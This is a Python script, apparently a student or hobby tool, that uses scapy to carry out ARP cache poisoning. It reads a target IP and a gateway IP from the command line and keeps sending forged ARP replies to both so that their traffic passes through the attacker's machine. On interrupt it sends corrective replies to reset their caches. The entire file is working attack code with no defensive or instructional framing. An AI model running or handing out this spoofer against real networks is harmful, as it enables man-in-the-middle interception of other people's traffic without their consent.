from tabnanny import verbose
from async_timeout import timeout
import scapy.all as scapy
import optparse as parse
import time


def arp_poisoning(target_ip, router_id):
    mac_address = get_mac_address(target_ip)
    # op: arp response 2; arp request 1
    arp_response = scapy.ARP(op=2, pdst=target_ip,
                             hwdst=mac_address, psrc=router_id)
    scapy.send(arp_response, verbose=False)
    # scapy.ls(arp_response)


def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    brodcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    combined = arp_request/brodcast_packet
    answer_list = scapy.srp(combined, timeout=1, verbose=False)[0]
    return answer_list[0][1].hwsrc


def get_user_input():
    parse_object = parse.OptionParser()
    parse_object.add_option(
        '-t', "--target", dest="target_ip", help="Target Ip")
    parse_object.add_option(
        '-g', "--gateway", dest="router_ip", help="Router Ip")
    (option, arg) = parse_object.parse_args()
    if not option.target_ip:
        print("Enter Targer IP")
    if not option.router_ip:
        print("Enter Gateway IP")
    return option


def reset_operation(target_ip, router_id):
    mac_address = get_mac_address(target_ip)
    gateway_mac = get_mac_address(router_id)
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_address,
                             psrc=router_id, hwsrc=gateway_mac)  # op: arp response 2; arp request 1
    scapy.send(arp_response, verbose=False, count=5)


number = 0

user_ips = get_user_input()
target_ip = user_ips.target_ip
router_id = user_ips.router_ip


try:
    while True:
        arp_poisoning(target_ip, router_id)
        arp_poisoning(router_id, target_ip)
        number += 2
        print('\rSending Packets ' + str(number), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit & Reset")
    reset_operation(target_ip, router_id)
    reset_operation(router_id, target_ip)
